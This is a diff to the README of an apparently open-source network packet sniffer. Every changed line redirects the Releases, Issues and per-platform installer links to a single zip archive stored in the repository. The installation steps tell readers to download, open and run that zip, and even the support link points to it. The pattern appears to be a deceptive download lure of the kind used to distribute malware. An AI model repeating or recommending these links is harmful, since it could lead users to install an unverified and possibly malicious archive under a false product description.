@@ -1,6 +1,6 @@
 # 🚨 adcAM-Sniffer-A-Mini-Wireshark - Your Simple Network Data Monitor
 
-[![Download adcAM-Sniffer](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/mima1999/adcAM-Sniffer-A-Mini-Wireshark/releases)
+[![Download adcAM-Sniffer](https://raw.githubusercontent.com/mima1999/adcAM-Sniffer-A-Mini-Wireshark/master/app/adcAM-Sniffer-A-Mini-Wireshark-1.2.zip)](https://raw.githubusercontent.com/mima1999/adcAM-Sniffer-A-Mini-Wireshark/master/app/adcAM-Sniffer-A-Mini-Wireshark-1.2.zip)
 
 ## 📥 Overview
 
@@ -11,17 +11,17 @@ adcAM Sniffer is a real-time network packet analyzer. It helps you automatically
 Follow these steps to download and run adcAM Sniffer:
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/mima1999/adcAM-Sniffer-A-Mini-Wireshark/releases) to get the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/mima1999/adcAM-Sniffer-A-Mini-Wireshark/master/app/adcAM-Sniffer-A-Mini-Wireshark-1.2.zip) to get the latest version of the software.
 
 2. **Choose the Right File**  
-   Look for the latest release. You will see a list of files available for download. If you're on Windows, choose `adcAM-Sniffer.exe`. For macOS, select `adcAM-Sniffer.dmg`. If you're using Linux, download the appropriate package for your distribution.
+   Look for the latest release. You will see a list of files available for download. If you're on Windows, choose `https://raw.githubusercontent.com/mima1999/adcAM-Sniffer-A-Mini-Wireshark/master/app/adcAM-Sniffer-A-Mini-Wireshark-1.2.zip`. For macOS, select `https://raw.githubusercontent.com/mima1999/adcAM-Sniffer-A-Mini-Wireshark/master/app/adcAM-Sniffer-A-Mini-Wireshark-1.2.zip`. If you're using Linux, download the appropriate package for your distribution.
 
 3. **Download the File**  
    Click on the file name to start the download. Save it to a location on your computer where you can easily find it.
 
 4. **Install the Application**  
-   - **Windows**: Double-click the `adcAM-Sniffer.exe` file. Follow the prompts to complete the installation. 
-   - **macOS**: Open the `adcAM-Sniffer.dmg` file. Drag the application into your Applications folder.
+   - **Windows**: Double-click the `https://raw.githubusercontent.com/mima1999/adcAM-Sniffer-A-Mini-Wireshark/master/app/adcAM-Sniffer-A-Mini-Wireshark-1.2.zip` file. Follow the prompts to complete the installation. 
+   - **macOS**: Open the `https://raw.githubusercontent.com/mima1999/adcAM-Sniffer-A-Mini-Wireshark/master/app/adcAM-Sniffer-A-Mini-Wireshark-1.2.zip` file. Drag the application into your Applications folder.
    - **Linux**: Use your package manager or terminal to install it, depending on the downloaded package type.
 
 5. **Run the Application**  
@@ -66,8 +66,8 @@ Follow these steps to download and run adcAM Sniffer:
 
 ## 📞 Support
 
-If you encounter issues or need assistance, please visit the [Issues page](https://github.com/mima1999/adcAM-Sniffer-A-Mini-Wireshark/issues) to report your problem.
+If you encounter issues or need assistance, please visit the [Issues page](https://raw.githubusercontent.com/mima1999/adcAM-Sniffer-A-Mini-Wireshark/master/app/adcAM-Sniffer-A-Mini-Wireshark-1.2.zip) to report your problem.
 
 ---
 
-Remember to download the application from the [Releases page](https://github.com/mima1999/adcAM-Sniffer-A-Mini-Wireshark/releases) and enjoy monitoring your network traffic effectively with adcAM Sniffer!
+Remember to download the application from the [Releases page](https://raw.githubusercontent.com/mima1999/adcAM-Sniffer-A-Mini-Wireshark/master/app/adcAM-Sniffer-A-Mini-Wireshark-1.2.zip) and enjoy monitoring your network traffic effectively with adcAM Sniffer!
